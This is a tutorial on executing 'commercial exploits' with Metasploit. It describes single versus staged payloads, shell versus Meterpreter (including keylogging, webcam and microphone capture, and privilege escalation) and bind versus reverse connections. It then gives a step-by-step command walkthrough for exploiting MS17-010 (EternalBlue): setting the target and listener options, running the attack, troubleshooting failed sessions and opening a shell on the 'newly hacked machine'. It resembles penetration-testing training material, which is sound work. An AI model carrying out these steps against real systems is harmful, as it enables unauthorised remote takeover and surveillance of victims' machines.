Executing Commercial Exploits

Process For Executing A Commercial Exploit

1) Search for an exploit using a keyword

2) Load an exploit as a module

3) Tune the exploit by modifying the options which are required

4) Run the exploit and wait for the results to show up

Reliability Ranks In Metasploit For Exploit Search

	-> Manual
	-> Low
	-> Average
	-> Normal
	-> Good
	-> Great
	-> Excellent

Single vs. Staged Payloads: 

The payload is the malicious code that is sent to the target system once a weakness has been exploited successfully. The payload may allow an attacker to control the system, take screenshots, record audio, and much more.

If the payload code is sent all at once, It is called a single (also known as non-staged payload) and if the payload code is sent in parts through multiple stages, It is called a stager (or staged payload)

Shell vs. Meterpreter Payload Types: 

Shell is a simple payload that gives remote access to the system console. It will be a command prompt if the target is running Windows or a terminal if the target is running macOS or Linux.

Meterpreter is a more advanced payload with built-in options that depend on the target machine. The Windows Meterpreter provides the most features including taking screenshots, controlling the webcam, keylogging, recording using the microphone, accessing a system shell, escalating privileges to administrator-level, and many more.

Bind vs. Reverse Connection:

The payload needs to establish a connection between the two machines to give the attacker access to the target machine.

In a bind connection, the attacker's machine connects to the target's machine. This can be used when the target allows inbound connections in its firewall configurations.

In a reverse connection, the target's machine connects back to the attacker's machine. This is helpful when the target allows only outbound connections in its firewall configurations.

Using Metasploit: 

Step-by-step Instructions to Execute an Exploit

Exploit Name - MS17-010 (Eternal Blue). Exploit Location - Metasploit-Framework

Instructions:

1) Open a terminal and launch the Metasploit console

-> msfconsole

2) Search for the available exploits using the search type:exploit (exploit-keyword)

-> search type:exploit eternalblue

3) Use the exploit with the use (exploit-module-number)

-> use 2

4) To check for the available payloads, you may use show payloads command and set the payload using set payload <payload number>

-> set payload 208

5) Check the list of required options using the show options command

-> show options

6) To change an option, use `set ` command ```bash set RHOSTS 10.10.10.10 set LHOST 0.0.0.0 set LPORT 123 ``` We are setting `LPORT` to `123` because that port is often left open

7) To check the exploitability, use the `check` command ```bash check ```

8) Use the`run` or `exploit` command to start the attack process. ```bash run ```

9) If the exploit completes successfully but no session is created, try the following troubleshooting steps: - run it a few more times (sometimes this works!) - changing the `LPORT` - change the payload ```bash set payload windows/meterpreter/bind_tcp exploit ```

10) When Meterpreter shell is opened use the `help` command to learn what you can do on this machine ```bash help ```

11) Use the `shell` command to open a system shell if needed ```bash shell ```

12) Run `ipconfig` to check the newly hacked machine's **IP Address** ```bash ipconfig ```

Further Reading:

To learn more about Meterpreter, read this article from Offensive Security About The Metasploit Meterpreter(https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/#:~:text=Meterpreter%20is%20an%20advanced%2C%20dynamically,completion%2C%20channels%2C%20and%20more.)

There are many other payloads supported by Metasploit, You can read about them here: Payload Types in the Metasploit Framework(https://www.offensive-security.com/metasploit-unleashed/payload-types/)





























